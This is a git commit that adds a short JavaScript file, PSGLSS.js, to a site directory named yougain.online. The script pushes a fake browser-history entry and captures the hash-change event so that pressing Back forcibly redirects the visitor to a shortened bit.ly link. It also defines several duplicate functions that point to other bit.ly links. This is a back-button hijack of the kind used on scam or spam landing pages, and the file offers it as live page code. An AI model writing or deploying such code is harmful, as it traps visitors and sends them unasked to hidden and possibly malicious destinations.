719e9126df5cfc7bc4459b47d28920dd7fc2f9c0
xanos6 <78304466+xanos6@users.noreply.github.com>
2025-04-24 16:54:26 +0100

    Create PSGLSS.js

---
+++ yougain.online/PSGLSS.js
@@ -0,0 +1,17 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://bit.ly/4ayYZ9t";
+    }
+    function goon(){
+        location.href="https://bit.ly/4ayYZ9t";
+    }
+function goon(){
+        location.href="https://bit.ly/3VMnbBc";
+    }
+function goon(){
+        location.href="https://bit.ly/3VMnbBc";
+    }
